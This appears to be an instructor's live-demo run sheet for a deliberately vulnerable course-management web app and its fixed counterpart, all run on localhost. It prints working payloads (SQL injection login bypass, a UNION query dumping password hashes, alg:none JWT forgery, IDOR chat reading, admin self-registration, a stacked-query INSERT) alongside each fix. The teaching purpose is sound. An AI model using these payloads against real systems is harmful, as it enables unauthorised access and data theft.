# Live demo run sheet

A sequence for presenting each vulnerability, then the fix, in front of the class.
Keep three terminals and a browser open.

## Setup (before you start)

```bash
pip install -r requirements.txt
(cd contracts && forge build)                   # compile GradeLedger once

# Terminal C — local Ethereum node (start it FIRST; the secure build needs it)
anvil --host 127.0.0.1 --port 8545 --chain-id 31337

# Terminal A — vulnerable build
RESET_DB=1 python3 app.py                       # http://127.0.0.1:3000

# Terminal B — secure build (leave running to show the fix instantly)
RESET_DB=1 APP_MODE=secure PORT=3001 python3 app.py
```

Open <http://127.0.0.1:3000> in the browser.

For each item: **show it broken on :3000**, explain the one-line cause, then run the
**same request against :3001** to show it fixed. `V=http://127.0.0.1:3000` and
`S=http://127.0.0.1:3001`.

**Getting your token** (needed for the `curl` steps): after signing in, open the
browser dev-tools console and run `localStorage.token`, or grab it from a login call:

```bash
TOK=$(curl -s -X POST $V/api/login -H 'Content-Type: application/json' \
      -d '{"username":"alice","password":"password1"}' | python3 -c 'import sys,json;print(json.load(sys.stdin)["token"])')
```

Optional: point Burp Suite's proxy at the browser and repeat any request in
Repeater — good for showing the raw HTTP and editing the JWT.

---

## 1. SQL injection (login)

**Break:** on the login page enter username `admin'-- ` and any password → you're
admin. Or:

```bash
curl -s -X POST $V/api/login -H 'Content-Type: application/json' \
  -d '{"username":"admin'\''-- ","password":"x"}'
```

**Explain:** the username is pasted into the SQL string; `--` comments out the
password check. Show `h_login` in `app.py`.

**Fix:** same request on `$S` → `401`. Show the `# SECURE` branch (bound parameter).

---

## 2. Insecure password storage + SQLi data theft

**Break:** as `alice` (token above), dump every password hash with a UNION on the
certifications endpoint:

```bash
curl -s -G "$V/api/certifications" -H "Authorization: Bearer $TOK" \
  --data-urlencode "student_id=0 UNION SELECT id,role,username,password_hash,hash_scheme,NULL,full_name FROM users"
```

Then crack one live:

```bash
python3 -c 'import hashlib;print(hashlib.md5(b"qwerty").hexdigest())'   # = carol's hash
```

**Explain:** unsalted MD5 → instant reversal; concatenated `student_id` → injection.

**Fix:** on `$S` the same payload returns `403`; show `sqlite3 sms_secure.db "SELECT
username,hash_scheme,salt FROM users"` → PBKDF2 + salt.

---

## 3. Broken JWT (token forgery)

**Break:** forge an admin token with no secret and hit the admin API:

```bash
FORGED=$(python3 - <<'PY'
import auth, json
h=auth.b64url_encode(json.dumps({"alg":"none","typ":"JWT"}).encode())
p=auth.b64url_encode(json.dumps({"sub":4,"username":"alice","role":"admin"}).encode())
print(f"{h}.{p}.")
PY
)
curl -s "$V/api/admin/users" -H "Authorization: Bearer $FORGED"
```

(Or, in the browser, set the forged token with `localStorage.token = "<forged>"` in
the dev-tools console, reload, and open **Admin**.)

**Explain:** the server never checks the signature and accepts `alg:none`. Show
`jwt_decode_vuln`.

**Fix:** same token on `$S` → `401`. Show `jwt_decode_secure` (pin alg, verify HMAC,
check expiry).

---

## 4. IDOR — reading other people's private chats

This is the headline demo. As the student `alice`, open **Chat** and click any
conversation — the address bar shows `#chat?chat_users[0]=4&chat_users[1]=5` (your id
and the other person's).

**Break:** change those two ids in the address bar to `1` and `2` — the private
`admin` ↔ `prof_smith` conversation — and press Enter. You now read their secret:

```
… the grading portal master password is Adm1n_Gu@rd14n_2026 …
```

Same thing from the terminal:

```bash
curl -s "$V/api/chat?chat_users[0]=1&chat_users[1]=2" -H "Authorization: Bearer $TOK"
```

**Explain:** the endpoint returns whichever conversation the URL names, with no check
that you are one of the two participants.

**Fix:** on `$S`, `chat_users[0]=1&chat_users[1]=2` → `403`; your own conversation
(`4` & `5`) → `200`.

---

## 5. Privilege escalation (self-register as admin)

**Break:** on the register form set **Role = admin**, create the account, sign in →
admin. Or:

```bash
curl -s -X POST $V/api/register -H 'Content-Type: application/json' \
  -d '{"username":"hacker","password":"x","role":"admin"}'
```

**Fix:** on `$S` the new account is always `student`.

---

## 6. Cryptography — signatures and encryption

**Signatures (forged diploma):** on `$V`, inject a fake certificate through the
**Course search** box using the stacked-query SQLi (#9) —

```
%'; INSERT INTO certifications (student_id,title,grade,issued_date,signature,issued_by) VALUES (4,'PhD in Computer Science','A+','2026-01-01',NULL,1); --
```

load Certifications → the fake PhD shows **✔ valid** (the vuln build never verifies).
On `$S`, real certs are **✔ valid**; now tamper one in the DB and reload:

```bash
sqlite3 sms_secure.db "UPDATE certifications SET grade='20.00' WHERE title LIKE 'Course Completion%';"
```

→ that certificate flips to **✘ INVALID** (Ed25519 signature no longer matches), and
a cert *inserted* this way is also **not on chain**. Show the public key at
`$S/api/pubkey`.

**Encryption at rest:** compare the two databases:

```bash
sqlite3 sms_vuln.db   "SELECT subject, body FROM messages LIMIT 2;"   # plaintext
sqlite3 sms_secure.db "SELECT subject, body FROM messages LIMIT 2;"   # AES-GCM ciphertext
```

**Explain:** encryption protects the database file; access control (#4) protects the
API. You need both.

---

## 7. Blockchain integrity ledger (smart contract)

Open **Blockchain** in the sidebar on `$S`. The banner shows the `GradeLedger`
contract address and the **issuer** — the only key allowed to write. Below it, the
grade-integrity table (every row **✔ matches**) and the anchored events, each with
its sender and transaction hash. The vuln build has no Blockchain page at all.

**Quickest version:** `python3 scripts/try_attack.py` plays the attacker against both
builds and prints a side-by-side result (reset afterwards with
`docker compose restart vuln secure`). The steps below do the same by hand.

**Break (vuln build, `$V`):** change a grade straight in the database — the app has
no way to notice:

```bash
sqlite3 sms_vuln.db "UPDATE grades SET grade='20.00' WHERE student_id=4 AND course_id=1;"
curl -s $V/api/my/grades -H "Authorization: Bearer $TOK"   # Mathematics 20.00, no alarm anywhere
```

**Fix 1 — DB tampering is detected (`$S`).** Same edit on the secure DB, then reload
**Blockchain**: Mathematics shows **DB 20.00**, a DB hash different from the
contract hash → **✘ TAMPERED**.

```bash
TOKS=$(curl -s -X POST $S/api/login -H 'Content-Type: application/json' \
      -d '{"username":"alice","password":"password1"}' | python3 -c 'import sys,json;print(json.load(sys.stdin)["token"])')
sqlite3 sms_secure.db "UPDATE grades SET grade='20.00' WHERE student_id=4 AND course_id=1;"
curl -s $S/api/grades/integrity -H "Authorization: Bearer $TOKS"   # Mathematics ok:false
```

A certificate forged straight into the DB is caught twice — open **Certifications**:
**✘ invalid** (no valid signature) **and** **⚠ not on chain**:

```bash
sqlite3 sms_secure.db "INSERT INTO certifications (student_id,title,grade,issued_date,signature) \
  VALUES (4,'PhD in Computer Science','A+','2026-01-01','ZmFrZXNpZw==');"
```

**Fix 2 — the attacker can't fix up the ledger.** To hide the edit they would need
to anchor the new hash. Try it from another account (anvil's public account #1):

```bash
ADDR=$(jq -r .address keys/deployment.json)
cast send $ADDR "anchorGrade(uint256,uint256,bytes32)" 1 4 $(cast keccak "20.00") \
  --private-key 0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d \
  --rpc-url http://127.0.0.1:8545
# Error: ... execution reverted: custom error 0x54ec5063 ... NotIssuer
cast call $ADDR "issuer()(address)" --rpc-url http://127.0.0.1:8545   # the app's key
```

**Explain:** the DB holds the records, the contract holds their hashes, in a separate
process. Editing the DB breaks the match; fixing the contract needs the issuer's
private key, which the `onlyIssuer` modifier enforces. Show `GradeLedger.sol`.

Re-seed to a clean state with `RESET_DB=1 APP_MODE=secure PORT=3001 python3 app.py`
(also required after restarting anvil — it keeps no state).

---

## One-line recap for each fix

| Vuln | Root cause | Fix |
|------|-----------|-----|
| SQLi | string concatenation | bound parameters |
| Weak hashing | unsalted MD5 | PBKDF2 + salt |
| JWT forgery | signature not verified | verify HMAC, pin alg, check exp |
| IDOR | no ownership check | check sender/recipient/admin |
| Privesc | client sets role | server sets role |
| Access control | no role check | check role/ownership server-side |
| Crypto | plaintext + unsigned | AES-GCM at rest + Ed25519 signatures |
| Integrity | records trusted blindly | issuer-only smart contract: anchor hashes on write, verify on read |

> If you prefer to patch live instead of switching ports: open `app.py` / `auth.py`,
> change the `# VULN` line to the `# SECURE` line shown right beside it, restart
> Terminal A, and re-run the request.
